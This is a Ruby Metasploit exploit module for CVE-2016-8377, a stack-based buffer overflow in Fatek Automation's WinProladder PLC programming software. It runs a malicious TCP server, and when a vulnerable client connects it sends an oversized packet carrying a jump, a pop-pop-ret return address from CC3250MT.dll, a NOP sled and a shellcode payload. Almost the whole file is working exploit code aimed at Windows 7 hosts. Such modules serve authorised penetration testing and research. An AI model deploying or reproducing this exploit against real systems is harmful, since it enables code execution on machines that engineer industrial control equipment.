require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Fatek Automation PLC WinProladder Stack-based Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow found in Fatek Automation
				PLC WinProladder v3.11 Build 14701. The vulnerability is triggered when a client
				connects to a listening server. The client does not properly sanitize the length
				of the received input prior to placing it on the stack.
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'ZDI', '16-672' ],
					[ 'CVE', '2016-8377' ],
					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-350-01' ]
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows 7 EN', 
							{
								# CC3250MT.dll
								# pop ecx/ pop ebp/ retn
								'Ret' => 0x32514d79
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Dec 15 2016'))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The port to listen on", 500])
			], self.class)
	end

	def on_client_data(client)
		p = payload.encoded

		pkt = "A" * 10000
		pkt[1092, 4] = [0x04eb9090].pack('V')	# jmp $+6
		pkt[1096, 4] = [target.ret].pack('V')
		pkt[1100, 50] = "\x90" * 50
		pkt[1150, p.length] = p

		client.put(pkt)
		handler
		service.close_client(client)
	end

end